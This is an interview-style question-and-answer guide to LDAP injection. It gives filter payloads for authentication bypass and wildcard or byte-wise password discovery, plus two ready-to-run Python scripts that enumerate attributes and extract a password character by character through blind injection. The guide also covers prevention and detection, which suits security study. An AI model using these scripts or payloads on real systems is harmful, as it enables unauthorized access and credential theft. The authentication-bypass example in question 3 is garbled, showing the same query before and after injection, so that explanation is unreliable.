# Advanced Interview Questions on LDAP Injection

## 1. What is LDAP Injection and how does it pose a security threat to web applications?

**Answer**: LDAP Injection is an attack that exploits web applications constructing LDAP statements based on user input. When an application fails to properly sanitize user input, it is possible to modify LDAP statements using a local proxy. This can lead to unauthorized access to sensitive data, bypassing authentication mechanisms, and potentially executing arbitrary commands within the LDAP server.

---

## 2. Describe the methodology used to perform LDAP Injection attacks.

**Answer**: The methodology for LDAP Injection involves manipulating user-supplied input to alter LDAP queries. This includes:
1. Identifying input fields that are used in LDAP queries.
2. Attempting to inject special characters and operators to manipulate the query logic.
3. Using techniques like authentication bypass, blind exploitation, and exploiting default attributes to achieve the desired outcome.
4. Crafting specific payloads to test for vulnerabilities and retrieve sensitive information.

---

## 3. Explain how authentication bypass can be achieved using LDAP Injection with an example.

**Answer**: Authentication bypass using LDAP Injection can be achieved by manipulating the filter logic to include always-true conditions. For example, consider the following query:

```ldap
(&(uid=admin)(!(1=0)(userPassword=q)))
```

By injecting `admin)(!(&(1=0` as the username, the query becomes:

```ldap
(&(uid=admin)(!(1=0)(userPassword=q)))
```

This always evaluates to true, effectively bypassing the authentication check.

---

## 4. What is Blind LDAP Injection and how can it be exploited?

**Answer**: Blind LDAP Injection is a technique where attackers exploit LDAP vulnerabilities without directly seeing the results of their queries. Instead, they rely on the application's different responses to crafted queries. This can be used to perform binary search or character-based brute-forcing to discover sensitive information like passwords. For example:

```ldap
(&(sn=administrator)(password=M*))
```

If this query returns true, the attacker knows the password starts with 'M'. They can continue refining their search to discover the full password.

---

## 5. List some default attributes commonly targeted in LDAP Injection attacks and explain their significance.

**Answer**: Commonly targeted default attributes in LDAP Injection attacks include:
- `userPassword`: Stores user passwords.
- `surname`: User's surname (last name).
- `name`: User's full name.
- `cn`: Common name.
- `sn`: Surname.
- `objectClass`: Defines the schema for the object.
- `mail`: User's email address.
- `givenName`: User's given (first) name.
- `commonName`: User's common name.

These attributes are significant because they can be used to manipulate LDAP queries and retrieve sensitive information.

---

## 6. How can the userPassword attribute be exploited in LDAP Injection attacks?

**Answer**: The `userPassword` attribute in LDAP is an OCTET STRING, meaning it is stored as a sequence of bytes. Exploiting this attribute involves using the `octetStringOrderingMatch` rule (OID 2.5.13.18) to perform a bit-by-bit comparison. For example:

```ldap
userPassword:2.5.13.18:=\xx (\xx is a byte)
userPassword:2.5.13.18:=\xx\xx
userPassword:2.5.13.18:=\xx\xx\xx
```

This allows the attacker to compare specific bytes in the password and incrementally discover the full password.

---

## 7. Provide an example of a Python script to discover valid LDAP fields through injection.

**Answer**:
```python
#!/usr/bin/python3
import requests
import string

fields = []
url = 'https://URL.com/'
f = open('dic', 'r')
world = f.read().split('\n')
f.close()

for i in world:
    r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'})  #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
    if 'TRUE CONDITION' in r.text:
        fields.append(str(i))

print(fields)
```

This script iterates through a list of potential LDAP fields, injecting each one into the query, and checks if the condition is true to identify valid fields.

---

## 8. Explain how blind LDAP Injection can be automated to discover sensitive information, with an example.

**Answer**: Blind LDAP Injection can be automated using scripts that iterate through possible characters and positions, checking for true conditions. Here's an example using Python:

```python
#!/usr/bin/python3
import requests, string
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(50):
    print("[i] Looking for number " + str(i))
    for char in alphabet:
        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
        if ("TRUE CONDITION" in r.text):
            flag += char
            print("[+] Flag: " + flag)
            break
```

This script iterates through possible characters, appending each one to the flag if the condition is true, gradually building the sensitive information (e.g., password).

---

## 9. What are some effective ways to prevent LDAP Injection vulnerabilities in web applications?

**Answer**: To prevent LDAP Injection vulnerabilities, developers should:
- Properly sanitize and escape user input before including it in LDAP queries.
- Use parameterized queries or prepared statements to separate data from code.
- Implement input validation to ensure only expected values are accepted.
- Use security libraries and frameworks that provide built-in protection against injection attacks.
- Regularly review and update the code to address potential vulnerabilities.

---

## 10. How can LDAP Injection be detected during security testing?

**Answer**: LDAP Injection can be detected during security testing by:
- Using automated scanners to identify potential injection points.
- Manually testing input fields with crafted payloads to observe unexpected behavior.
- Reviewing application logs for signs of injection attempts.
- Performing code reviews to identify improper input handling and query construction.
- Implementing unit tests to check for injection vulnerabilities during development.

---
